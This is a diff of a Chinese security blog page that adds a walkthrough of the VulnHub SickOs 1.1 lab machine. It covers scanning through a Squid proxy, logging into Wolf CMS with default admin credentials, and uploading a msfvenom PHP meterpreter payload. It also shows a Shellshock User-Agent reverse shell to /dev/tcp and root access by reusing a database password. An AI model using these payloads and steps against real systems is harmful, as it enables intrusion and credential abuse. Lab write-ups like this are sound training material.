@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="标签, JAVA、Web安全、代码审计、免杀">
+    <meta name="keywords" content="VulnHub-SickOs-1.1渗透学习, JAVA、Web安全、代码审计、免杀">
     <meta name="description" content="逆风的方向更适合飞翔">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>标签 | F10Sec</title>
+    <title>VulnHub-SickOs-1.1渗透学习 | F10Sec</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -333,12 +333,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/17.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/20.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">tags</h1>
+                    <h1 class="description center-align post-title">VulnHub-SickOs-1.1渗透学习</h1>
                 </div>
             </div>
         </div>
@@ -452,9 +452,13 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E9%9D%B6%E6%9C%BA/">
+                                <span class="chip bg-color">靶机</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -480,14 +484,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    0
+                    1.3k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    5 分
                 </div>
                 
 
@@ -515,7 +519,168 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>靶机地址：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/sickos/sick0s1.1.7z">https://download.vulnhub.com/sickos/sick0s1.1.7z</a></p>
+<p>靶机难度：中级（CTF）</p>
+<p>靶机发布日期：2015年12月11日</p>
+<p>靶机描述：这个CTF明确地比喻了如何在网络上执行黑客策略，以在安全的环境中危害网络。 这个虚拟机与我在OSCP中遇到的实验室非常相似。 目的是破坏网络/计算机并在其上获得管理/根目录特权。</p>
+<p>目标：得到root权限&amp;找到flag.txt</p>
+<p>作者：F10Sec</p>
+<p>时间：2021-07-05</p>
+<p>请注意：</p>
+<p>对于所有这些计算机，我已经使用VMware运行下载的计算机。我将使用Kali Linux作为解决该目标的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>我们在VM中需要确定攻击目标的IP地址，可以使用netdiscover/nmap来获取目标主机的IP地址：</p>
+<pre class="line-numbers language-go" data-language="go"><code class="language-go">nmap <span class="token operator">-</span>sP <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span> <span class="token operator">-</span>T4
+参数解读：
+	<span class="token operator">-</span>sP <span class="token punctuation">:</span> 用ping扫描判断主机是否存活，只有主机存活，nmap才会继续扫描，一般最好不加，因为有的主机会禁止ping
+	<span class="token operator">-</span>T4： 指定扫描过程使用的时序，总有<span class="token number">6</span>个级别（<span class="token number">0</span><span class="token operator">-</span><span class="token number">5</span>），级别越高，扫描速度越快，但也容易被防火墙或IDS检测并屏蔽掉，在网络通讯状况较好的情况下推荐使用T4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625488802260-9a7bc345-a871-43e3-a291-af8aae42b5ce.png" alt="img"></p>
+<p>我们已经找到了目标计算机IP地址：192.168.1.11</p>
+<p>第一步是找出目标计算机上可用的开放端口和一些服务。因此我在目标计算机上启动了nmap全端口T5速度扫描：</p>
+<pre class="line-numbers language-go" data-language="go"><code class="language-go">nmap <span class="token operator">-</span>sS <span class="token operator">-</span>sV <span class="token operator">-</span>sC <span class="token operator">-</span>O <span class="token operator">-</span>T5  <span class="token operator">-</span>Pn <span class="token operator">-</span>p<span class="token operator">-</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.11</span>
+参数解读：
+	<span class="token operator">-</span>A ：启用<span class="token operator">-</span>A选项之后，Nmap将检测目标主机的下述信息
+        服务版本识别（<span class="token operator">-</span>sV）；
+        操作系统识别（<span class="token operator">-</span>O）；
+        脚本扫描（<span class="token operator">-</span>sC）；
+        Traceroute（–traceroute）
+	<span class="token operator">-</span>sS<span class="token operator">/</span>sT<span class="token operator">/</span>sA<span class="token operator">/</span>sW<span class="token operator">/</span>sM<span class="token punctuation">:</span>指定使用 TCP SYN<span class="token operator">/</span><span class="token function">Connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">/</span>ACK<span class="token operator">/</span>Window<span class="token operator">/</span>Maimon scans的方式来对目标主机进行扫描
+	<span class="token operator">-</span>sV<span class="token punctuation">:</span> 指定让Nmap进行服务版本扫描
+	<span class="token operator">-</span>p<span class="token operator">-</span>：进行全端口扫描
+	<span class="token operator">-</span>Pn：禁用主机检测（<span class="token operator">-</span>Pn）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625489265480-d004e9de-b2d6-447c-a7c8-23f3727f92e6.png" alt="img"></p>
+<table>
+<thead>
+<tr>
+<th>PORT</th>
+<th>SERVICE</th>
+<th>VERSION DETECTION</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>TCP: 22</td>
+<td>SSH</td>
+<td>OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)</td>
+</tr>
+<tr>
+<td>TCP: 3128</td>
+<td>HTTP-Proxy</td>
+<td>Squid http proxy 3.1.19</td>
+</tr>
+<tr>
+<td>TCP: 8080</td>
+<td>HTTP-Proxy</td>
+<td>http proxy 3.1.19</td>
+</tr>
+</tbody></table>
+<p>目标计算机上开放了22、3128、8080三个端口。</p>
+<h2 id="Squid-枚举"><a href="#Squid-枚举" class="headerlink" title="Squid 枚举"></a>Squid 枚举</h2><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625489832462-ea47ada4-bf0d-4207-bc5f-05e5479eaf94.png" alt="img"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625490115939-b1890c08-c033-45e5-bc14-b1a7564cdec7.png" alt="img"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625490571383-53382ea2-bada-49c1-b771-4dd97a171259.png" alt="img"></p>
+<h2 id="Nikto-通过代理扫描"><a href="#Nikto-通过代理扫描" class="headerlink" title="Nikto 通过代理扫描"></a>Nikto 通过代理扫描</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">nikto ：开源的WEB扫描评估软件，可以扫描指定主机的WEB类型、主机名、指定目录、特定CGI漏洞、返回主机允许的 http模式等
+
+nikto <span class="token operator">-</span>h 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>11 <span class="token operator">-</span>useproxy http:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>11:3128<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625490880205-874e1d7b-ac47-4084-9e97-24478438a90b.png" alt="img"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625490919180-5dfcf0f9-e2b4-49e4-a9c3-65d1ad3e65c3.png" alt="img"></p>
+<table>
+<thead>
+<tr>
+<th><a target="_blank" rel="noopener" href="https://www.wappalyzer.com/technologies/web-servers/?utm_source=popup&utm_medium=extension&utm_campaign=wappalyzer">Web 服务器</a></th>
+<th>编程语言</th>
+<th><a target="_blank" rel="noopener" href="https://www.wappalyzer.com/technologies/operating-systems/?utm_source=popup&utm_medium=extension&utm_campaign=wappalyzer">操作系统</a></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Apache: 2.2.22</td>
+<td>PHP 5.3.10</td>
+<td>Ubuntu</td>
+</tr>
+</tbody></table>
+<p>Nikto 扫描发现存在<code>robots.txt</code>目录、<code>cgi-bin/status</code>（容易受到shellshock攻击），存在可利用漏洞；</p>
+<h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p>这边先用开启代理，然后访问目标主机的80端口；</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625491096696-e33ad101-5fe3-46e2-aee5-6a0bda320087.png" alt="img"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625491166160-fa2fe2c0-a950-4200-8122-80a0fb93b961.png" alt="img"></p>
+<p>查看源代码没啥游泳的信息，这边是用代理来访问的80，打开robots.txt发现存在wolfcms目录；</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625491393695-4eaaf303-7c36-4502-b29a-c8fb3e5e8478.png" alt="img"></p>
+<p>找到/wolfcms的信息，有可能此网站是使用Wolf CMS中搭建的，也可能是个目录……..</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625491427774-54f9bdb9-ac9d-46ea-b7ef-283ea51ba697.png" alt="img"></p>
+<p>使用搜索引擎搜索Wolf CMS，发现是个开源的CMS，在github[<a target="_blank" rel="noopener" href="https://github.com/wolfcms/wolfcms]%E4%B8%8A%E5%8F%AF%E4%BB%A5%E6%9F%A5%E7%9C%8B%E5%88%B0%E6%BA%90%E7%A0%81%E4%BF%A1%E6%81%AF%EF%BC%9B">https://github.com/wolfcms/wolfcms]上可以查看到源码信息；</a></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625491730188-e47473d8-d6a4-4e53-aa27-b6e4f63c7dec.png" alt="img"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625491872657-160d5a0c-7404-4b8e-a160-93c91fdcb85f.png" alt="img"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625492107077-2477680c-3a6d-4b93-b0ce-824240e4a06f.png" alt="img"></p>
+<h2 id="目录枚举"><a href="#目录枚举" class="headerlink" title="目录枚举"></a>目录枚举</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">gobuster <span class="token function">dir</span> <span class="token operator">-</span>u http:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>11/wolfcms/  <span class="token operator">-</span>w <span class="token operator">/</span>usr/share/wordlists/dirbuster/directory-list-2<span class="token punctuation">.</span>3-medium<span class="token punctuation">.</span>txt <span class="token operator">-</span>t 50 <span class="token operator">--</span>random-agent   <span class="token operator">--</span>proxy   http:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>11:3128<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625543994254-cea6e145-030e-49ec-885d-94fd76db4d2d.png" alt="img"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625544093447-989c41d2-6018-45ee-8e49-8e2d1d53a1f5.png" alt="img"></p>
+<p>访问下/?/admin/login，这是通病…遇到Wolf cms直接能使用这个目录进入登录界面</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625491995376-9a943e81-22f0-4f58-98be-7711f9e185d5.png" alt="img"></p>
+<p>使用账户密码admin/admin成功登录到网站后台(不要问我怎么知道的…….)</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625492062491-1bf6f796-d5f3-4007-84f0-a88efbd4fbe2.png" alt="img"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625492484023-9aef7233-cd6c-4b56-bdde-90c07f1ac94c.png" alt="img"></p>
+<h2 id="上传Webshell"><a href="#上传Webshell" class="headerlink" title="上传Webshell"></a>上传Webshell</h2><h3 id="1、上传php-meterpreter-payload文件，浏览器访问上传后的文件，获取php类型的反弹会话；"><a href="#1、上传php-meterpreter-payload文件，浏览器访问上传后的文件，获取php类型的反弹会话；" class="headerlink" title="1、上传php meterpreter payload文件，浏览器访问上传后的文件，获取php类型的反弹会话；"></a>1、上传php meterpreter payload文件，浏览器访问上传后的文件，获取php类型的反弹会话；</h3><p>成功登录后，发现能上传文件，这边要使用msfvenom做PHP木马文件上传进行shell提权</p>
+<h4 id="1、筛选payload"><a href="#1、筛选payload" class="headerlink" title="1、筛选payload"></a>1、筛选payload</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">msfvenom <span class="token operator">-</span>l payload <span class="token punctuation">|</span> grep php <span class="token punctuation">|</span> grep meterpreter    筛选合适的payload<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625492694428-c1bb5de2-0a57-4525-8951-e9a7a12392dc.png" alt="img"></p>
+<h4 id="2、生成payload"><a href="#2、生成payload" class="headerlink" title="2、生成payload"></a>2、生成payload</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">msfvenom <span class="token operator">-</span>p php/meterpreter_reverse_tcp lhost=192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>7 lport=6666 <span class="token operator">-</span>o Wolfcms<span class="token punctuation">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625493050247-8085e516-f41c-443a-b773-90c43d8bcaee.png" alt="img"></p>
+<h4 id="3、上传payload"><a href="#3、上传payload" class="headerlink" title="3、上传payload"></a>3、上传payload</h4><p>在web页面上传后记录下上传文件的路径；</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625493135854-efbcb978-6628-48b1-a69e-50f00a4d951d.png" alt="img"></p>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">上传后文件的目录：http:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>11/wolfcms/public/Wolfcms<span class="token punctuation">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="4、Kali设置监听载荷"><a href="#4、Kali设置监听载荷" class="headerlink" title="4、Kali设置监听载荷"></a>4、Kali设置监听载荷</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">use exploit/multi/handler
+<span class="token function">set</span> payload php/meterpreter_reverse_tcp
+show options
+<span class="token function">set</span> LHOST 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>7
+<span class="token function">set</span> LPORT 6666
+exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625493300660-ad7ca097-e95c-4146-9dc5-440ece7e87a9.png" alt="img"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625493415266-4f8f23e3-1091-4a0d-aa53-9f75b77f3ace.png" alt="img"></p>
+<p>注意：此时上传的php类型的Meterpreter是不具备完整功能的，因此可以继续上传对应操作系统类型的payload获取更多的操作功能；这里发现随然获取了Metrepreter会话，但是shell命令无法执行，后续使用冰蝎上传weblshell连接；</p>
+<h3 id="2、利用冰蝎上传weblshell连接"><a href="#2、利用冰蝎上传weblshell连接" class="headerlink" title="2、利用冰蝎上传weblshell连接"></a>2、利用冰蝎上传weblshell连接</h3><p>这里必须配置好代理才可以正常连接webshell；</p>
+<h4 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625536956286-bf10d381-6732-43db-be3b-3dd0b02a0339.png" alt="img"></h4><h2 id="Shellshock-Bash-反向-Shell"><a href="#Shellshock-Bash-反向-Shell" class="headerlink" title="Shellshock Bash 反向 Shell"></a>Shellshock Bash 反向 Shell</h2><p>Burp Suite 用于操作 User-Agent：包括 bash 反向 shell。</p>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> ignored<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token operator">/</span>bin/bash <span class="token operator">-</span>i >&amp; <span class="token operator">/</span>dev/tcp/192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>221<span class="token punctuation">.</span>139/443 0>&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625496313431-016dacbd-2a26-4c11-9f1f-5f2f5060911a.png" alt="img"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625496301802-1eac507c-b8c1-4d12-841e-10fea1321369.png" alt="img"></p>
+<p>查看/var/www/wolfcms/目录下的config.php文件；</p>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token operator">/</span><span class="token operator">/</span> Database settings:
+<span class="token keyword">define</span><span class="token punctuation">(</span><span class="token string">'DB_DSN'</span><span class="token punctuation">,</span> <span class="token string">'mysql:dbname=wolf;host=localhost;port=3306'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">define</span><span class="token punctuation">(</span><span class="token string">'DB_USER'</span><span class="token punctuation">,</span> <span class="token string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">define</span><span class="token punctuation">(</span><span class="token string">'DB_PASS'</span><span class="token punctuation">,</span> <span class="token string">'john@123'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">define</span><span class="token punctuation">(</span><span class="token string">'TABLE_PREFIX'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>查看系统存在的可登录账户：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625534894942-48ff9917-3de0-435d-8749-83cf5d67ea59.png" alt="img"></p>
+<p>使用python一句话获取标准shell</p>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">python <span class="token operator">-</span>c <span class="token string">'import pty;pty.spawn("/bin/bash")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625535832495-b71e7e54-53d4-476f-9599-58b862b2928a.png" alt="img"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625544442975-4f2d8ced-485f-4831-96f4-acc160a1e39d.png" alt="img"></p>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">www-<span class="token keyword">data</span>@SickOs:<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www$ su <span class="token operator">-</span> sickos
+su <span class="token operator">-</span> sickos
+Password: john@123
+
+sickos@SickOs:~$ <span class="token function">ls</span>     
+<span class="token function">ls</span>
+sickos@SickOs:~$ <span class="token function">cat</span> <span class="token punctuation">.</span>bash_history
+<span class="token function">cat</span> <span class="token punctuation">.</span>bash_history
+sudo su
+<span class="token keyword">exit</span>
+sickos@SickOs:~$ sudo su
+sudo su
+<span class="token namespace">[sudo]</span> password <span class="token keyword">for</span> sickos: john@123
+
+root@SickOs:<span class="token operator">/</span>home/sickos<span class="token comment"># </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625535933066-d4ae66d7-72c8-40b6-b3a0-153b5b1ef561.png" alt="img"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625536001789-7e74ee89-de4f-4690-9bac-e5548de8db47.png" alt="img"></p>
+<p>成功获取到Flag；</p>
+<p>若有收获，就点个赞吧</p>
+
                 
             </div>
             <hr/>
@@ -541,7 +706,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://F10Sec.github.io/tags/index.html">https://F10Sec.github.io/tags/index.html</a>
+                    <a href="https://F10Sec.github.io/2022/01/19/VulnHub-SickOs-1.1%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">https://F10Sec.github.io/2022/01/19/VulnHub-SickOs-1.1%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -578,7 +743,11 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/%E9%9D%B6%E6%9C%BA/">
+                                    <span class="chip bg-color">靶机</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -647,13 +816,13 @@
                 <i class="far fa-dot-circle"></i>&nbsp;本篇
             </div>
             <div class="card">
-                <a href="/tags/index.html">
+                <a href="/2022/01/19/VulnHub-SickOs-1.1%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="tags">
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="VulnHub-SickOs-1.1渗透学习">
                         
-                        <span class="card-title">tags</span>
+                        <span class="card-title">VulnHub-SickOs-1.1渗透学习</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -676,22 +845,30 @@
                 </div>
 
                 
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E9%9D%B6%E6%9C%BA/">
+                        <span class="chip bg-color">靶机</span>
+                    </a>
+                    
+                </div>
+                
             </div>
         </div>
         
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/tags/index.html">
+                <a href="/2022/01/19/Fastjson%E5%9B%9E%E6%98%BE/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="tags">
+                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="Fastjson回显">
                         
-                        <span class="card-title">tags</span>
+                        <span class="card-title">Fastjson回显</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -712,7 +889,14 @@
                         </span>
                     </div>
                 </div>
-
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Fastjson/">
+                        <span class="chip bg-color">Fastjson</span>
+                    </a>
+                    
+                </div>
                 
             </div>
         </div>
